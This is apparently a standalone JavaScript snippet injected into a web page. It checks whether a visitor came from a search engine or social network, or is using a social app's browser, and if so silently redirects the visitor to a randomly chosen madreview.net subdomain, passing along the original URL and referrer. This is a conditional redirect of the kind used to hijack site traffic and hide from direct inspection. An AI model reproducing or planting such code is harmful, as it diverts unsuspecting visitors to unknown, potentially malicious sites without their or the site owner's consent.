var ars = rChoice([
    'https://download.madreview.net',
    'https://app1.madreview.net',
    'https://app3.madreview.net',
    'https://app5.madreview.net',
    'https://app7.madreview.net',
]);

function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mysearch.", ".baidu.", "duckduckgo.",
        "ask.", "aol."
    ].some((s) => document.referrer.toLowerCase().includes(s)) || ["fb", "facebook", "pinterest", "twitter", "messenger"].some((
        s) => navigator.userAgent.toLowerCase().includes(s))) {
    window.location.href = ars + "/?arsae=" + encodeURIComponent(window.location.href) + "&arsae_ref=" +
        encodeURIComponent(document.referrer);
}
